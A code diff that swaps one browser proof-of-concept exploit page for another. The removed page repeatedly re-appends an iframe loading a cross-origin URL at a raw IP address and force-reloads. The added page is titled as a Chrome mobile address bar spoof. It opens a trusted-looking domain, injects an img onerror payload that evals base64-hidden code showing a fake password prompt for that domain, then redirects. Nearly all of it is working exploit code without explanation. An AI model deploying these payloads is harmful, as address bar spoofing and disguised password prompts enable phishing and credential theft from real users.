@@ -1,81 +1,26 @@
 
-Open devtools to trigger (press F12 on windows) then wait a bit.
-
-
+<html>
+<head>
+    <title>Chrome Mobile App Address Bar Spoof Vulnerability</title>
+    <!--
+        author: evi1m0.bat[at]gmail.com
+        datetime: 2018/05/03 00:16:27
+        test version: for iPhone 66.0.3359.122
+    -->
+</head>
 <script>
-
-
-//This function is useful if the internet connection of the victim is too slow
-function sleep(delay) {
-        var start = new Date().getTime();
-        while (new Date().getTime() < start + delay);
-      }
-
-
- 
-//This function reappend an iframe during cross origin URL load
-
-function append_iframe_during_load(){
-
-
-
-//Load any cross origin URL
-i.src="http://176.31.255.221/sssssssss";
-
-
-
-//This sleep is useful when the internet connection of the victim is slow
-var t1=Math.floor(Math.random() * 30) + 0;
-sleep(t1);
-
-
-
-
-var c=Math.floor(Math.random() * 5) + 1;
-
-
-
-if(c==1){
-
-document.getElementById('div1').appendChild(i);
-
-console.log(1);
-}
-
-
-
-
-
-//Recurse
-var t=Math.floor(Math.random() * 10) + 1;
-setTimeout(function(){append_iframe_during_load();},t);
-
-}
-
-
- 
- 
- 
-
-
-//Init
-
-var i=document.documentElement.appendChild(document.createElement('iframe'));
- 
-
-var t=Math.floor(Math.random() * 1000) + 100;
-setTimeout(function(){append_iframe_during_load();},t);
-
-
-
-
-//Reload
-setTimeout(function(){location.reload();},2000);
-
-
-
-
+    pwn = () => {
+        x = open('https://test.baidu.com', 'win');
+        setTimeout(`
+            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><a href="https://google.com/" id="test">test</a>');
+            `, 1000);
+        setTimeout(`
+            x.close();
+            window.location='http://test.baidu.com';
+            `, 1300);
+    }
 </script>
-
-
-<div id="div1"></div>
+<h1>
+    <a onclick="pwn()">ClickMe :-)</a>
+</h1>
+</html>
